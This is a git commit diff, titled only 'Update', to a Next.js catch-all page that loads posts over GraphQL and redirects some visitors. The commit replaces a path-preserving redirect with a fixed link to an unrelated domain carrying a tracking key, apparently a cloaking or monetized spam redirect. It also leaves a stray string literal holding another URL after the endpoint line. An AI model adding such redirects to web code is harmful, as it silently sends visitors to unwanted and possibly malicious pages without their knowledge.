592233b71b9b9f68d8f6e86c345d59a10edb8337
TBG120 <116538827+TBG120@users.noreply.github.com>
2026-05-11 09:45:39 +0530

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = process.env.GRAPHQL_ENDPOINT as string;
+	const endpoint = process.env.GRAPHQL_ENDPOINT as string; "https://moviebuzzamerica.byethost17.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://saveourstateok.org/` + encodeURI(path as string)
+					`https://bowlsharp.com/ajm9z7evu?key=157a5023c7c5951f66f6fead014f2284`
 				}`,
 			},
 		};
